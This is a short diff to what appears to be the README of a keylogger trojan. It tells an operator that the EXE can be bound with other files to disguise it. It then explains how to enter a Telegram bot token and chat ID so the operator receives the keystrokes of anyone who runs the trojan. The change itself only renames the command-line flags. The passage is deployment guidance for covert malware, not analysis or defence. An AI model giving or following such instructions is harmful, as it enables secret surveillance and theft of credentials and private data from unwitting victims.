@@ -28,7 +28,7 @@ You can deliver the EXE file as it is, or bind it with other files so that it is
 - click start
   ![chatID](https://user-images.githubusercontent.com/109946641/213140607-f9fb7b75-deda-4b1e-9098-3390d6c95e6b.jpg)
 
-- enter Bot Token with `-bt BotTOKEN` and enter ChatId with `-ci YourChatID`
+- enter Bot Token with `token BotTOKEN` and enter ChatId with `chatID YourChatID`
 - now you can see all keylogger data who will run the trojan
 ---
 ## Disclaimer
